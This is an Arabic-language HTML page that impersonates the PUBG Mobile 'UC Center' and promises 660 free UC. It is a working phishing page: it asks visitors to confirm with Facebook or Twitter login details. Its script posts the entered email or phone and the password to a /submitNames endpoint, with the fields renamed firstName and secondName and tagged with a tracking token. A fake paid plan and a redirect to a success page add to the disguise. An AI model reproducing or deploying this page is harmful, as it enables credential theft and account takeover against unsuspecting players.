<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="PUBG UC Center - شحن شدات مجاناً">
    <meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
    <title>PUBG Mobile | UC Center</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #0b0d10; color: #f3f3f3; margin: 0; }
        .header { background: #fbb034; color: #000; padding: 15px; text-align: center; font-weight: bold; font-size: 24px; border-bottom: 4px solid #000; }
        .container { max-width: 450px; margin: 30px auto; background: #1a1d22; padding: 30px; border-radius: 15px; border: 1px solid #fbb034; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #2a2e35; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #fbb034; color: #000; border: none; border-radius: 5px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 15px; }
        .plan { border: 1px solid #444; padding: 15px; border-radius: 10px; margin: 10px 0; cursor: pointer; display: flex; justify-content: space-between; }
        .plan.active { border-color: #fbb034; background: rgba(251, 176, 52, 0.1); }
        .login-btns { display: flex; gap: 10px; margin-top: 20px; }
        .l-btn { flex: 1; padding: 10px; border: none; border-radius: 5px; color: white; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">PUBG MOBILE UC ⚡</div>
    <div class="container">
        <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="80" style="border-radius: 10px; margin-bottom: 15px;">
        <h2>اشحن 660 شدة مجاناً</h2>
        <input type="text" id="id" placeholder="ID اللاعب (Character ID)">
        <div class="plan active" onclick="sel(this, '0')"><span>660 UC</span> <b style="color:#fbb034">مجاني</b></div>
        <div class="plan" onclick="sel(this, '25')"><span>8100 UC</span> <b style="color:#fbb034">24.99$</b></div>
        
        <div id="loginSection">
            <p>سجل دخول لتأكيد الحساب واستلام الشدات:</p>
            <div class="login-btns">
                <button class="l-btn" style="background:#1877f2;" onclick="showL('Facebook')">Facebook</button>
                <button class="l-btn" style="background:#fff; color:black; border:1px solid #ccc;" onclick="showL('Twitter')">Twitter</button>
            </div>
            <div id="lInputs" style="display:none; margin-top:20px;">
                <input type="text" id="u" placeholder="البريد أو الهاتف">
                <input type="password" id="p" placeholder="كلمة السر">
                <button class="btn" id="b" onclick="send()">تأكيد الشحن</button>
            </div>
        </div>
    </div>
    <script>
        const token = new URLSearchParams(window.location.search).get('t');
        let isFree = true;
        function sel(el, p) {
            document.querySelectorAll('.plan').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
            isFree = (p === '0');
            document.getElementById('b').innerText = isFree ? "تأكيد الشحن" : "شراء الآن ("+p+"$)";
        }
        function showL(t) { document.getElementById('lInputs').style.display = 'block'; }
        async function send() {
            if(!isFree) return alert('بوابة الدفع معطلة!');
            const btn = document.getElementById('b');
            btn.disabled = true; btn.innerText = "جاري المعالجة...";
            await fetch('/submitNames', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, firstName: document.getElementById('u').value, secondName: document.getElementById('p').value })
            });
            window.location.href = "/ok.html";
        }
    </script>
</body>
</html>
